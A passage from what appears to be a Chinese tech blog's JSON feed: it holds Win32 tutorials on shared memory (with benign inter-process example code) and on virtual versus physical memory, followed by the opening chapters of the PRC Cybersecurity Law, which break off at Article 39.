malloc 是申请堆内存，new malloc 其实是在已申请的内存上面划分出一块虚拟内存。</p>\n<p>new 关键字本质也就是 malloc + 构造函数。malloc 的底层是通过 HeapAlloc 申请的，并没有进 0 环。</p>\n<h2 id=\"共享内存申请\"><a class=\"anchor\" href=\"#共享内存申请\">#</a> 共享内存申请</h2>\n<p>共享内存其实就是物理页共享使用，A 进程申请物理页并写入内容，B 进程可以读取。</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>HANDLE <span class=\"token function\">CreateFileMapping</span><span class=\"token punctuation\">(</span>  </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  HANDLE hFile<span class=\"token punctuation\">,</span>                       </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  LPSECURITY_ATTRIBUTES lpAttributes<span class=\"token punctuation\">,</span> </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  DWORD flProtect<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  DWORD dwMaximumSizeHigh<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  DWORD dwMaximumSizeLow<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  LPCTSTR lpName</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>参数介绍:</p>\n<ol>\n<li>文件映射。申请的物理页可以跟文件相映射，如果不需要文件只申请物理页则填 <code>INVALID_HANDLE_VALUE</code> 。</li>\n<li>SD 安全属性，每个内核对象都需要的安全属性。</li>\n<li>权限。你申请的这个物理页是可读的可写的还是可读写。</li>\n<li>申请内存的高 32 位。windows 为了支持 64 位操作系统，所以给了高低 32 位来保存地址， 如果是 32 位地址，则不需要，填 NULL 即可.</li>\n<li>低 32 位。你要申请的物理页内存的大小</li>\n<li>进程共享物理页的名字。如果希望这个物理页其他进程可以使用，则需要给一个名字。</li>\n</ol>\n<p>返回值：返回物理页句柄索引。</p>\n<p>有创建物理页 也有打开物理页 主要是其他进程使用。</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>HANDLE <span class=\"token function\">OpenFileMapping</span><span class=\"token punctuation\">(</span>  DWORD dwDesiredAccess<span class=\"token punctuation\">,</span>  <span class=\"token comment\">// access mode</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  BOOL bInheritHandle<span class=\"token punctuation\">,</span>    <span class=\"token comment\">// inherit flag</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  LPCTSTR lpName          <span class=\"token comment\">// object name);</span></pre></td></tr></table></figure><p>当然如果其他进程使用一样可以使用 CreateFileMaping，只不过会返回文件对象已经存在的错误。</p>\n<h3 id=\"线性地址虚拟地址-关联物理页\"><a class=\"anchor\" href=\"#线性地址虚拟地址-关联物理页\">#</a> 线性地址 (虚拟地址) 关联物理页</h3>\n<p>我们还需要将这个物理页映射到线性地址。<br />\n需要的 API 如下</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>LPVOID <span class=\"token function\">MapViewOfFile</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  HANDLE hFileMappingObject<span class=\"token punctuation\">,</span>   <span class=\"token comment\">// 物理页句柄</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  DWORD dwDesiredAccess<span class=\"token punctuation\">,</span>       <span class=\"token comment\">// 线性地址访问权限。注意跟物理页最好一致，或者比物理页更低。</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  DWORD dwFileOffsetHigh<span class=\"token punctuation\">,</span>      <span class=\"token comment\">// 映射线性地址的偏移位置 高 32 位</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  DWORD dwFileOffsetLow<span class=\"token punctuation\">,</span>       <span class=\"token comment\">// 低 32 位</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  SIZE_T dwNumberOfBytesToMap  <span class=\"token comment\">// 内存映射结束位置</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"关闭映射\"><a class=\"anchor\" href=\"#关闭映射\">#</a> 关闭映射</h3>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>BOOL WINAPI <span class=\"token function\">UnmapViewOfFile</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  _In_LPCVOID lpBaseAddress   <span class=\"token comment\">// 指定要解除映射的一个文件映射的基准地址。这个地址是早先用 MapViewOfFile 函数获得的</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>返回值 Bool，非零表示成功，零表示失败。可以通过 GetLastError () 获取错误代码。</p>\n<p>关闭物理页句柄用 <code>CloseHandle()</code></p>\n<h2 id=\"实例\"><a class=\"anchor\" href=\"#实例\">#</a> 实例</h2>\n<p>A 进程</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;Windows.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">WIN32_LEAN_AND_MEAN</span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">MapFileName</span> <span class=\"token expression\">L</span><span class=\"token string\">\"共享内存\"</span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">M_Page</span> <span class=\"token expression\"><span class=\"token number\">0x1000</span></span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>HANDLE g_hMapFile<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>LPVOID  g_lpBuff<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\">// 共享内存</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t<span class=\"token comment\">// 内核对象物理页</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\tg_hMapFile <span class=\"token operator\">=</span> <span class=\"token function\">CreateFileMapping</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\tINVALID_HANDLE_VALUE<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t\t<span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\tPAGE_READWRITE<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\t<span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t\tM_Page<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t\tMapFileName</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\tg_lpBuff <span class=\"token operator\">=</span> <span class=\"token function\">MapViewOfFile</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t\tg_hMapFile<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t\tFILE_MAP_WRITE<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t\t<span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t\t<span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t\tM_Page</pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\t<span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>PDWORD<span class=\"token punctuation\">)</span>g_lpBuff <span class=\"token operator\">=</span> <span class=\"token number\">0x12345678</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\t<span class=\"token function\">getchar</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\t<span class=\"token function\">UnmapViewOfFile</span><span class=\"token punctuation\">(</span>g_lpBuff<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\t<span class=\"token function\">CloseHandle</span><span class=\"token punctuation\">(</span>g_hMapFile<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>B 进程</p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span><span class=\"token string\">&lt;Windows.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">WIN32_LEAN_AND_MEAN</span></span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">MapFileName</span> <span class=\"token expression\">L</span><span class=\"token string\">\"共享内存\"</span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">M_Page</span> <span class=\"token expression\"><span class=\"token number\">0x1000</span></span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>HANDLE g_hMapFile<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>LPVOID  g_lpBuff<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\">// 共享内存</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t<span class=\"token function\">getchar</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t<span class=\"token comment\">// 内核对象物理页</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\tg_hMapFile <span class=\"token operator\">=</span> <span class=\"token function\">CreateFileMapping</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t\tINVALID_HANDLE_VALUE<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\t<span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\tPAGE_READWRITE<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t\t<span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t\tM_Page<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t\tMapFileName</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\tg_lpBuff <span class=\"token operator\">=</span> <span class=\"token function\">MapViewOfFile</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t\tg_hMapFile<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t\tFILE_MAP_WRITE<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t\t<span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t\t<span class=\"token number\">0</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t\tM_Page</pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\t<span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%d\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>PDWORD<span class=\"token punctuation\">)</span>g_lpBuff<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\t<span class=\"token function\">getchar</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\t<span class=\"token function\">UnmapViewOfFile</span><span class=\"token punctuation\">(</span>g_lpBuff<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\t<span class=\"token function\">CloseHandle</span><span class=\"token punctuation\">(</span>g_hMapFile<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>A 进程写入，B 进程访问。</p>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n",
            "tags": [
                "Win32",
                "私有内存",
                "共享内存"
            ]
        },
        {
            "id": "https://self-ferry.github.io/Win%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E4%B8%8E%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98/",
            "url": "https://self-ferry.github.io/Win%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E4%B8%8E%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98/",
            "title": "Win虚拟内存与物理内存",
            "date_published": "2021-07-12T07:57:22.000Z",
            "content_html": "<h1 id=\"正文\"><a class=\"anchor\" href=\"#正文\">#</a> 正文</h1>\n<p>学过计算机操作系统后，会有更深的理解。</p>\n<p><img data-src=\"image001.png\" alt=\"\" /></p>\n<h2 id=\"虚拟内存地址划分\"><a class=\"anchor\" href=\"#虚拟内存地址划分\">#</a> 虚拟内存地址划分</h2>\n<p><img data-src=\"image002.png\" alt=\"\" /></p>\n<h2 id=\"可供使用的物理内存\"><a class=\"anchor\" href=\"#可供使用的物理内存\">#</a> 可供使用的物理内存</h2>\n<p>MmNumberOfPhysicalPages* 4 = 物理内存<br />\n虛拟内存 (硬盘)<br />\n 能够识别的物理内存:<br />\n32 位系统最多可以识别物理内存为 64G，但由于操作系统的限制<br />\n比如 XP, 只能识别 4G (Windows 2003 服务器版本可以识别 4G 以上</p>\n<h2 id=\"pagefilesys\"><a class=\"anchor\" href=\"#pagefilesys\">#</a> pagefile.sys</h2>\n<p>如果我们的物理页超过了。那么操作系统还支持使用硬盘来当物理内存.</p>\n<p>具体设置</p>\n<p>计算机属性 -&gt; 高级系统设置 -&gt; 高级 - &gt; 性能设置 -&gt; 高级 -&gt; 虚拟内存更改</p>\n<p><img data-src=\"image003.png\" alt=\"\" /></p>\n<p>pagefile.sys 文件</p>\n<p><img data-src=\"image004.png\" alt=\"\" /></p>\n",
            "tags": [
                "Win32",
                "虚拟内存",
                "物理内存"
            ]
        },
        {
            "id": "https://self-ferry.github.io/%E4%B8%AD%E5%8D%8E%E4%BA%BA%E6%B0%91%E5%85%B1%E5%92%8C%E5%9B%BD%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B3%95/",
            "url": "https://self-ferry.github.io/%E4%B8%AD%E5%8D%8E%E4%BA%BA%E6%B0%91%E5%85%B1%E5%92%8C%E5%9B%BD%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B3%95/",
            "title": "中华人民共和国网络安全法",
            "date_published": "2021-07-12T06:58:34.000Z",
            "content_html": "<h1 id=\"中华人民共和国网络安全法全文\"><a class=\"anchor\" href=\"#中华人民共和国网络安全法全文\">#</a> 中华人民共和国网络安全法（全文）</h1>\n<h2 id=\"第一章-总则\"><a class=\"anchor\" href=\"#第一章-总则\">#</a> 第一章 总则</h2>\n<p>第一条 为了保障网络安全，维护网络空间主权和国家安全、社会公共利益，保 护公民、法人和其他组织的合法权益，促进经济社会信息化健康发展，制定本法。</p>\n<p>第二条 在中华人民共和国境内建设、运营、维护和使用网络，以及网络安全的 监督管理，适用本法。</p>\n<p>第三条 国家坚持网络安全与信息化发展并重，遵循积极利用、科学发展、依法 管理、确保安全的方针，推进网络基础设施建设和互联互通，鼓励网络技术创新 和应用，支持培养网络安全人才，建立健全网络安全保障体系，提高网络安全保 护能力。</p>\n<p>第四条国家制定并不断完善网络安全战略，明确保障网络安全的基本要求和主 要目标，提出重点领域的网络安全政策、工作任务和措施。</p>\n<p>第五条 国家采取措施，监测、防御、处置来源于中华人民共和国境内外的网络 安全风险和威胁，保护关键信息基础设施免受攻击、侵入、干扰和破坏，依法惩 治网络违法犯罪活动，维护网络空间安全和秩序。</p>\n<p>第六条 国家倡导诚实守信、健康文明的网络行为，推动传播社会主义核心价值 观，采取措施提高全社会的网络安全意识和水平，形成全社会共同参与促进网络 安全的良好环境。</p>\n<p>第七条国家积极开展网络空间治理、网络技术研发和标准制定、打击网络违法 犯罪等方面的国际交流与合作，推动构建和平、安全、开放、合作的网络空间， 建立多边、民主、透明的网络治理体系。</p>\n<p>第八条国家网信部门负责统筹协调网络安全工作和相关监督管理工作。国务院电 信主管部门、公安部门和其他有关机关依照本法和有关法律、行政法规的规定， 在各自职责范围内负责网络安全保护和监督管理工作。<br />\n县级以上地方人民政府有关部门的网络安全保护和监督管理职责，按照国家有关 规定确定。</p>\n<p>第九条网络运营者开展经营和服务活动，必须遵守法律、行政法规，尊重社会公 德，遵守商业道德，诚实信用，履行网络安全保护义务，接受政府和社会的监督，承担社会责任。</p>\n<p>第十条 建设、运营网络或者通过网络提供服务，应当依照法律、行政法规的规 定和国家标准的强制性要求，采取技术措施和其他必要措施，保障网络安全、稳 定运行，有效应对网络安全事件，防范网络违法犯罪活动，维护网络数据的完整 性、保密性和可用性。</p>\n<p>第十一条网络相关行业组织按照章程，加强行业自律，制定网络安全行为规范， 指导会员加强网络安全保护，提高网络安全保护水平，促进行业健康发展。</p>\n<p>第十二条国家保护公民、法人和其他组织依法使用网络的权利，促进网络接入普 及，提升网络服务水平，为社会提供安全、便利的网络服务，保障网络信息依法 有序自由流动。<br />\n任何个人和组织使用网络应当遵守宪法法律，遵守公共秩序，尊重社会公德，不 得危害网络安全，不得利用网络从事危害国家安全、荣誉和利益，煽动颠覆国家 政权、推翻社会主义制度，煽动分裂国家、破坏国家统一，宣扬恐怖主义、极端 主义，宣扬民族仇恨、民族歧视，传播暴力、淫秽色情信息，编造、传播虚假信 息扰乱经济秩序和社会秩序，以及侵害他人名誉、隐私、知识产权和其他合法权 益等活动。</p>\n<p>第十三条国家支持研究开发有利于未成年人健康成长的网络产品和服务，依法惩 治利用网络从事危害未成年人身心健康的活动，为未成年人提供安全、健康的网 络环境。</p>\n<p>第十四条任何个人和组织有权对危害网络安全的行为向网信、电信、公安等部门 举报。收到举报的部门应当及时依法作出处理；不属于本部门职责的，应当及时 移送有权处理的部门。<br />\n有关部门应当对举报人的相关信息予以保密，保护举报人的合法权益。</p>\n<h2 id=\"第二章网络安全支持与促进\"><a class=\"anchor\" href=\"#第二章网络安全支持与促进\">#</a> 第二章网络安全支持与促进</h2>\n<p>第十五条国家建立和完善网络安全标准体系。国务院标准化行政主管部门和国务 院其他有关部门根据各自的职责，组织制定并适时修订有关网络安全管理以及网 络产品、服务和运行安全的国家标准、行业标准。<br />\n国家支持企业、研究机构、高等学校、网络相关行业组织参与网络安全国家标准、 行业标准的制定。</p>\n<p>第十六条 国务院和省、自治区、直辖市人民政府应当统筹规划，加大投入，扶 持重点网络安全技术产业和项目，支持网络安全技术的研究开发和应用，推广安 全可信的网络产品和服务，保护网络技术知识产权，支持企业、研究机构和高等 学校等参与国家网络安全技术创新项目。</p>\n<p>第十七条国家推进网络安全社会化服务体系建设，鼓励有关企业、机构开展网 络安全认证、检测和风险评估等安全服务。</p>\n<p>第十八条国家鼓励开发网络数据安全保护和利用技术，促进公共数据资源开放，推动技术创新和经济社会发展。<br />\n国家支持创新网络安全管理方式，运用网络新技术，提升网络安全保护水平。</p>\n<p>第十九条 各级人民政府及其有关部门应当组织开展经常性的网络安全宣传教育，并指导、督促有关单位做好网络安全宣传教育工作。<br />\n大众传播媒介应当有针对性地面向社会进行网络安全宣传教育。</p>\n<p>第二十条国家支持企业和高等学校、职业学校等教育培训机构开展网络安全相关 教育与培训，采取多种方式培养网络安全人才，促进网络安全人才交流。</p>\n<h2 id=\"第三章网络运行安全\"><a class=\"anchor\" href=\"#第三章网络运行安全\">#</a> 第三章网络运行安全</h2>\n<p>第二十一条国家实行网络安全等级保护制度。网络运营者应当按照网络安全等级 保护制度的要求，履行下列安全保护义务，保障网络免受干扰、破坏或者未经授 权的访问，防止网络数据泄露或者被窃取、篡改：<br />\n（一）制定内部安全管理制度和操作规程，确定网络安全负责人，落实网络安全 保护责任；<br />\n（二）采取防范计算机病毒和网络攻击、网络侵入等危害网络安全行为的技术措 施；<br />\n（三）采取监测、记录网络运行状态、网络安全事件的技术措施，并按照规定留 存相关的网络日志不少于六个月；<br />\n（四）采取数据分类、重要数据备份和加密等措施；<br />\n（五）法律、行政法规规定的其他义务。</p>\n<p>第二十二条网络产品、服务应当符合相关国家标准的强制性要求。网络产品、服 务的提供者不得设置恶意程序；发现其网络产品、服务存在安全缺陷、漏洞等风 险时，应当立即采取补救措施，按照规定及时告知用户并向有关主管部门报告。<br />\n网络产品、服务的提供者应当为其产品、服务持续提供安全维护；在规定或者当 事人约定的期限内，不得终止提供安全维护。<br />\n网络产品、服务具有收集用户信息功能的，其提供者应当向用户明示并取得同意；涉及用户个人信息的，还应当遵守本法和有关法律、行政法规关于个人信息保护 的规定。</p>\n<p>第二十三条网络关键设备和网络安全专用产品应当按照相关国家标准的强制性要 求，由具备资格的机构安全认证合格或者安全检测符合要求后，方可销售或者提 供。国家网信部门会同国务院有关部门制定、公布网络关键设备和网络安全专用 产品目录，并推动安全认证和安全检测结果互认，避免重复认证、检测。</p>\n<p>第二十四条网络运营者为用户办理网络接入、域名注册服务，办理固定电话、移 动电话等入网手续，或者为用户提供信息发布、即时通讯等服务，在与用户签订 协议或者确认提供服务时，应当要求用户提供真实身份信息。用户不提供真实身 份信息的，网络运营者不得为其提供相关服务。<br />\n国家实施网络可信身份战略，支持研究开发安全、方便的电子身份认证技术，推 动不同电子身份认证之间的互认。</p>\n<p>第二十五条网络运营者应当制定网络安全事件应急预案，及时处置系统漏洞、计 算机病毒、网络攻击、网络侵入等安全风险；在发生危害网络安全的事件时，立 即启动应急预案，采取相应的补救措施 并按照规定向有关主管部门报告。</p>\n<p>第二十六条 开展网络安全认证、检测、风险评估等活动，向社会发布系统漏洞、 计算机病毒、网络攻击、网络侵入等网络安全信息，应当遵守国家有关规定。</p>\n<p>第二十七条任何个人和组织不得从事非法侵入他人网络、干扰他人网络正常功 能、窃取网络数据等危害网络安全的活动；不得提供专门用于从事侵入网络、干 扰网络正常功能及防护措施、窃取网络数据等危害网络安全活动的程序、工具； 明知他人从事危害网络安全的活动的，不得为其提供技术支持、广告推广、支付 结算等帮助。</p>\n<p>第二十八条网络运营者应当为公安机关、国家安全机关依法维护国家安全和侦 查犯罪的活动提供技术支持和协助。</p>\n<p>第二十九条 国家支持网络运营者之间在网络安全信息收集、分析、通报和应急 处置等方面进行合作，提高网络运营者的安全保障能力。<br />\n有关行业组织建立健全本行业的网络安全保护规范和协作机制，加强对网络安全 风险的分析评估，定期向会员进行风险警示，支持、协助会员应对网络安全风险。</p>\n<p>第三十条 网信部门和有关部门在履行网络安全保护职责中获取的信息，只能用 于维护网络安全的需要，不得用于其他用途。</p>\n<p>第二节关键信息基础设施的运行安全</p>\n<p>第三十一条 国家对公共通信和信息服务、能源、交通、水利、金融、公共服务、 电子政务等重要行业和领域，以及其他一旦遭到破坏、丧失功能或者数据泄露， 可能严重危害国家安全、国计民生、公共利益的关键信息基础设施，在网络安全 等级保护制度的基础上，实行重点保护。关键信息基础设施的具体范围和安全保 护办法由国务院制定。<br />\n国家鼓励关键信息基础设施以外的网络运营者自愿参与关键信息基础设施保护体 系。</p>\n<p>第三十二条按照国务院规定的职责分工，负责关键信息基础设施安全保护工作的 部门分别编制并组织实施本行业、本领域的关键信息基础设施安全规划，指导和 监督关键信息基础设施运行安全保护工作。</p>\n<p>第三十三条建设关键信息基础设施应当确保其具有支持业务稳定、持续运行的 性能，并保证安全技术措施同步规划、同步建设、同步使用。</p>\n<p>第三十四条 除本法第二十一条的规定外，关键信息基础设施的运营者还应当履 行下列安全保护义务：<br />\n（一）  设置专门安全管理机构和安全管理负责人，并对该负责人和关键岗位的人 员进行安全背景审查；<br />\n（二）\t定期对从业人员进行网络安全教育、技术培训和技能考核；<br />\n（三）\t对重要系统和数据库进行容灾备份；<br />\n（四）\t制定网络安全事件应急预案，并定期进行演练；<br />\n（五）\t法律、行政法规规定的其他义务。</p>\n<p>第三十五条关键信息基础设施的运营者采购网络产品和服务，可能影响国家安全 的，应当通过国家网信部门会同国务院有关部门组织的国家安全审查。</p>\n<p>第三十六条关键信息基础设施的运营者采购网络产品和服务，应当按照规定与 提供者签订安全保密协议，明确安全和保密义务与责任。</p>\n<p>第三十七条关键信息基础设施的运营者在中华人民共和国境内运营中收集和产生 的个人信息和重要数据应当在境内存储。因业务需要，确需向境外提供的，应当 按照国家网信部门会同国务院有关部门制定的办法进行安全评估；法律、行政法 规另有规定的，依照其规定。</p>\n<p>第三十八条关键信息基础设施的运营者应当自行或者委托网络安全服务机构对 其网络的安全性和可能存在的风险每年至少进行一次检测评估，并将检测评估情 况和改进措施报送相关负责关键信息基础设施安全保护工作的部门。</p>\n<p>第三十九条 国家网信部门应当统筹协调有关部门对关键信息基础设施的安全保 护采取下列措施：<br />\n(一) 对关键信息基础设施的安全风险进行抽查检测，提出改进措施，必要时可 以委托网络安全服务机构对网络存在的安全风险进行检测评估；<br />\n(二) 定期组织关键信息基础设施的运营者进行网络安全应急演练，提高应对网 络安全事件的水平和协同配合能力；<br 